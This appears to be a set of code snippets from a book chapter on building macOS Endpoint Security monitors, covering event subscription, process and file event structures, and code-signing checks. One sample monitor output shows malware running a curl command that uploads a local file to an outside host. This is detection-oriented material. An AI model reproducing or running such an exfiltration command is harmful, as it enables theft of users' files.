["```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n...\n<plist version=\"1.0\">\n<dict>\n    <key>**com.apple.developer.endpoint-security.client**</key>\n    <true/>\n</dict>\n</plist> \n```", "```\n/**\n * The valid event types recognized by EndpointSecurity\n *\n ...\n *\n*/\ntypedef enum {\n\n  // The following events are available beginning in macOS 10.15.\n  ES_EVENT_TYPE_AUTH_EXEC,\n  ES_EVENT_TYPE_AUTH_OPEN,\n  ES_EVENT_TYPE_AUTH_KEXTLOAD,\n  ...\n  ES_EVENT_TYPE_NOTIFY_EXEC,\n  ...\n  ES_EVENT_TYPE_NOTIFY_EXIT,\n  ...\n\n  // The following events are available beginning in macOS 13.0.\n  ES_EVENT_TYPE_NOTIFY_AUTHENTICATION,\n ES_EVENT_TYPE_NOTIFY_XP_MALWARE_DETECTED,\n  ES_EVENT_TYPE_NOTIFY_XP_MALWARE_REMEDIATED,\n  ...\n  ES_EVENT_TYPE_NOTIFY_BTM_LAUNCH_ITEM_ADD,\n  ES_EVENT_TYPE_NOTIFY_BTM_LAUNCH_ITEM_REMOVE,\n\n  // The following events are available beginning in macOS 14.0.\n  ...\n  ES_EVENT_TYPE_NOTIFY_XPC_CONNECT,\n\n  // The following events are available beginning in macOS 15.0.\n  ES_EVENT_TYPE_NOTIFY_GATEKEEPER_USER_OVERRIDE,\n  ...\n\n  ES_EVENT_TYPE_LAST\n} es_event_type_t; \n```", "```\n# **eslogger --list-events**\naccess\nauthentication\n...\nexec\n... \n```", "```\n# **eslogger exec**\n```", "```\n# **eslogger exec**\n{\n    \"event_type\": 9,\n        \"event\": {\n            \"exec\": {\n                \"script\": null,\n                \"target\": {\n                    \"signing_id\": \"com.apple.say\",\n                    \"executable\": {\n                    \"path\": \"\\/usr\\/bin\\/say\",\n                    \"ppid\": 1152,\n                    ...\n                    \"is_platform_binary\": true,\n                    \"audit_token\": {\n                        ...\n                    },\n                    \"original_ppid\": 1152,\n                    \"cdhash\": \"6C92E006B491C58B62F0C66E2D880CE5FE015573\",\n                    \"team_id\": null\n                },\n                \"image_cpusubtype\": -2147483646,\n                \"image_cputype\": 16777228,\n                \"args\": [\"say\", \"Hello\", \"World\"],\n                ...\n} \n```", "```\ntypedef struct {\n    uint32_t version;\n    struct timespec time;\n    uint64_t mach_time;\n    uint64_t deadline;\n    es_process_t* _Nonnull process;\n    uint64_t seq_num; /* field available only if message version >= 2 */\n    es_action_type_t action_type;\n    union {\n        es_event_id_t auth;\n        es_result_t notify;\n    } action;\n    es_event_type_t event_type;\n    es_events_t event;\n    es_thread_t* _Nullable thread; /* field available only if message version >= 4 */\n    uint64_t global_seq_num; /* field available only if message version >= 4 */\n    uint64_t opaque[]; /* Opaque data that must not be accessed directly */\n} es_message_t; \n```", "```\nswitch(message->event_type) {\n    case ES_EVENT_TYPE_NOTIFY_EXEC:\n        // Add code here to handle exec events.\n        break;\n\n    case ES_EVENT_TYPE_NOTIFY_FORK:\n        // Add code here to handle fork events.\n        break;\n\n    case ES_EVENT_TYPE_NOTIFY_EXIT:\n        // Add code here to handle exit events.\n        break;\n\n    default:\n        break;\n} \n```", "```\n/**\n * @brief Execute a new process.\n * @field target The new process that is being executed.\n * @field script The script being executed by the interpreter.\n ...\n*/\ntypedef struct {\n    es_process_t* _Nonnull target;\n    es_string_token_t dyld_exec_path; /* field available only if message version >= 7 */\n    union {\n        uint8_t reserved[64];\n        struct {\n            es_file_t* _Nullable script; /* field available only if message version >= 2 */\n            es_file_t* _Nonnull cwd; /* field available only if message version >= 3 */\n            int last_fd; /* field available only if message version >= 4 */\n            cpu_type_t image_cputype; /* field available only if message version >= 6 */\n            cpu_subtype_t image_cpusubtype; /* field available only if message version >= 6 */\n            };\n        };\n} es_event_exec_t; \n```", "```\n/**\n * @brief Information related to a process. This is used both for describing processes ...\n(e.g., for exec events, this describes the new process being executed).\n *\n * @field audit_token Audit token of the process\n * @field ppid Parent pid of the process\n ...\n * @field signing_id The signing id of the code signature associated with this process\n * @field team_id The team id of the code signature associated with this process\n * @field executable The executable file that is executing in this process\n...\n*/\ntypedef struct {\n    audit_token_t audit_token;\n    pid_t ppid;\n    pid_t original_ppid;\n    pid_t group_id;\n    pid_t session_id;\n    uint32_t codesigning_flags;\n    bool is_platform_binary;\n    bool is_es_client;\n    uint8_t cdhash[20];\n    es_string_token_t signing_id;\n    es_string_token_t team_id;\n    es_file_t* _Nonnull executable;\n    es_file_t* _Nullable tty;\n    struct timeval start_time;\n    audit_token_t responsible_audit_token;\n    audit_token_t parent_audit_token;\n} es_process_t; \n```", "```\n/**\n * @brief es_file_t provides the stat information and path to a file.\n\n * @field path Absolute path of the file\n * @field path_truncated Indicates if the path field was truncated\n ...\n*/\ntypedef struct {\n    es_string_token_t path;\n    bool path_truncated;\n    struct stat stat;\n} es_file_t; \n```", "```\n/**\n * @brief Structure for handling strings\n*/\ntypedef struct {\n    size_t length;\n    const char* data;\n} es_string_token_t; \n```", "```\nes_string_token_t* responsibleProcessPath = &message->process->executable->path;\nprintf(\"responsible process: %.*s\\n\",\n(int)responsibleProcessPath->length, responsibleProcessPath->data);\n\nes_string_token_t* newProcessPath = &message->event.exec.target->executable->path;\nprintf(\"new process: %.*s\\n\", (int)newProcessPath->length, newProcessPath->data); \n```", "```\nNSString* string = [[NSString alloc] initWithBytes:stringToken->data length:stringToken->\nlength encoding:NSUTF8StringEncoding]; \n```", "```\nes_client_t* client = NULL;\nes_event_type_t events[] = {ES_EVENT_TYPE_NOTIFY_EXEC, ES_EVENT_TYPE_NOTIFY_EXIT};\n\nes_new_client(&client, ^(es_client_t* client, const es_message_t* message) {\n    // Add code here to handle delivered events.\n});\n\nes_subscribe(client, events, sizeof(events)/sizeof(events[0])); ❶ \n```", "```\nes_event_type_t events[] = {ES_EVENT_TYPE_NOTIFY_EXEC, ES_EVENT_TYPE_NOTIFY_EXIT};\n```", "```\nes_client_t* client = NULL;\nes_new_client_result_t result =\nes_new_client(&client, ^(es_client_t* client, const es_message_t* message) { ❶\n    // Add code here to handle delivered events.\n});\n\nif(ES_NEW_CLIENT_RESULT_SUCCESS != result) { ❷\n    // Add code here to handle error.\n} \n```", "```\nes_event_type_t events[] = {ES_EVENT_TYPE_NOTIFY_EXEC, ES_EVENT_TYPE_NOTIFY_EXIT};\n\n// Removed code that invoked es_new_client\n\nes_subscribe(client, events, sizeof(events)/sizeof(events[0])); ❶ \n```", "```\nes_new_client(&client, ^(es_client_t* client, const es_message_t* message) {\n    es_process_t* process = NULL;\n  ❶ u_int32_t event = message->event_type;\n  ❷ switch(event) {\n      ❸ case ES_EVENT_TYPE_NOTIFY_EXEC:\n          process = message->event.exec.target;\n          ...\n          break;\n\n ❹ case ES_EVENT_TYPE_NOTIFY_EXIT:\n          process = message->process;\n          ...\n          break;\n    }\n    ...\n}); \n```", "```\nNSData* auditToken = [NSData dataWithBytes:&process->audit_token length:sizeof(audit_token_t)];\n```", "```\npid_t pid = audit_token_to_pid(process->audit_token);\n```", "```\nNSString* path = [[NSString alloc] initWithBytes:process->executable->path.data\nlength:process->executable->path.length encoding:NSUTF8StringEncoding]; \n```", "```\npid_t ppid = process->ppid; ❶\n\nif(message->version >= 4) {\n    NSData* parentToken = [NSData dataWithBytes:&process->parent_audit_token\n    length:sizeof(audit_token_t)]; ❷\n\n    NSData* responsibleToken = [NSData dataWithBytes:&process->responsible_audit_token\n    length:sizeof(audit_token_t)]; ❸\n\n} \n```", "```\n❶ if(message->version >= 2) {\n    es_string_token_t* token = &message->event.exec.script->path;\n  ❷ if(NULL != token) {\n        NSString* script = [[NSString alloc] initWithBytes:token->data\n        length:token->length encoding:NSUTF8StringEncoding];\n    }\n} \n```", "```\n# **ESPlayground.app/Contents/MacOS/ESPlayground -monitor**\n\nES Playground\nExecuting (process) 'monitor' logic\n\nevent: ES_EVENT_TYPE_NOTIFY_EXEC\n(new) process\n    pid: 10267\n    path: /usr/bin/python3\n    script: /Users/User/Malware/Realst/**installer.py**\"\n    ... \n```", "```\nif(message->version >= 6) {\n    cpu_type_t cpuType = message->event.exec.image_cputype;\n} \n```", "```\n// Process is an es_process_t*\n#import <kernel/kern/cs_blobs.h>\n\nuint32_t csFlags = process->codesigning_flags;\n\nif(CS_VALID & csFlags) {\n    // Add code here to handle dynamically valid process signatures.\n}\nif(CS_SIGNED & csFlags) {\n    // Add code here to handle process signatures.\n}\nif(CS_ADHOC & csFlags) {\n    // Add code here to handle ad hoc process signatures.\n}\n... \n```", "```\n// Process is an es_process_t*\n\nNSNumber* isPlatformBinary = [NSNumber numberWithBool:process->is_platform_binary]; \n```", "```\n// Process is an es_process_t*\n\nNSData* cdHash = [NSData dataWithBytes:(const void *)process->cdhash\nlength:sizeof(uint8_t)*CS_CDHASH_LEN]; \n```", "```\n// Process is an es_process_t*\n\nNSString* signingID = [[NSString alloc] initWithBytes:process->signing_id.data\nlength:process->signing_id.length encoding:NSUTF8StringEncoding];\n\nNSString* teamID = [[NSString alloc] initWithBytes:process->team_id.data\nlength:process->team_id.length encoding:NSUTF8StringEncoding]; \n```", "```\n# **ESPlayground.app/Contents/MacOS/ESPlayground -monitor**\n\nES Playground\nExecuting (process) 'monitor' logic\n\nevent: ES_EVENT_TYPE_NOTIFY_EXEC\n(new) process\n  pid: 10815\n  path: /Users/User/Malware/3CX/UpdateAgent\n  ...\n  code signing flags: 0x22000007\n  code signing flag 'CS_VALID' is set\n  code signing flag 'CS_SIGNED' is set\n  code signing flag 'CS_ADHOC' is set \n```", "```\nNSMutableArray* arguments = [NSMutableArray array];\n\nconst es_event_exec_t* exec = &message->event.exec;\n\n❶ for(uint32_t i = 0; i < es_exec_arg_count(exec); i++) {\n  ❷ es_string_token_t token = es_exec_arg(exec, i);\n  ❸ NSString* argument = [[NSString alloc] initWithBytes:token.data\n    length:token.length encoding:NSUTF8StringEncoding];\n\n  ❹ [arguments addObject:argument];\n} \n```", "```\n# **ESPlayground.app/Contents/MacOS/ESPlayground -monitor**\n\nES Playground\nExecuting (process) 'monitor' logic\n\nevent: ES_EVENT_TYPE_NOTIFY_EXEC\n(new) process\n pid: 18802\n path: /usr/bin/curl\n ...\n arguments : (\n  \"/usr/bin/curl\"\n  \"http://string2me.com/xnrftGrNZlVYWrkrqSoGzvKgUGpN/zgrcJOQKgrpkMLZcu.php\",\n  \"-F\",\n  \"qwe=@/Users/User/Library/lsd.app/Contents/Resources/14-06 06:28:07.jpg\",\n  \"-F\",\n  \"rest=BBA441FE-7BBB-43C6-9178-851218CFD268\",\n  \"-F\",\n  \"fsbd=Users-Mac.local-User\"\n) \n```", "```\ntypedef struct {\n    int stat;\n    uint8_t reserved[64];\n} es_event_exit_t; \n```", "```\n❶ case ES_EVENT_TYPE_NOTIFY_EXIT: {\n  ❷ int status = message->event.exit.stat;\n    ...\n} \n```", "```\nes_client_t* client = // Previously created via es_new_client\n...\nes_unsubscribe_all(client);\nes_delete_client(client); \n```", "```\nes_event_type_t events[] = {ES_EVENT_TYPE_NOTIFY_CREATE, ES_EVENT_TYPE_NOTIFY_OPEN,\nES_EVENT_TYPE_NOTIFY_CLOSE, ES_EVENT_TYPE_NOTIFY_UNLINK}; \n```", "```\ntypedef struct {\n  ❶ es_destination_type_t destination_type;\n    union {\n      ❷ es_file_t* _Nonnull existing_file;\n            struct {\n                es_file_t* _Nonnull dir;\n                es_string_token_t filename;\n                mode_t mode;\n            } new_path;\n        } destination;\n        ...\n    };\n} es_event_create_t; \n```", "```\n// Event type: ES_EVENT_TYPE_NOTIFY_CREATE\n\nif(ES_DESTINATION_TYPE_EXISTING_FILE == message->event.create.destination_type) {\n    es_string_token_t* token = &message->event.create.destination.existing_file->path;\n\n    NSString* path = [[NSString alloc] initWithBytes:token->data length:token->length encoding:\n    NSUTF8StringEncoding];\n\n    printf(\"Created path -> %@\\n\", path.UTF8String);\n} \n```", "```\nif(ES_EVENT_TYPE_NOTIFY_OPEN == message->event_type) {\n    es_string_token_t* token = &message->event.open.file->path;\n\n    NSString* path = [[NSString alloc] initWithBytes:token->data length:token->length\n    encoding:NSUTF8StringEncoding];\n\n    printf(\"Opened file -> %s\\n\", path.UTF8String);\n} \n```"]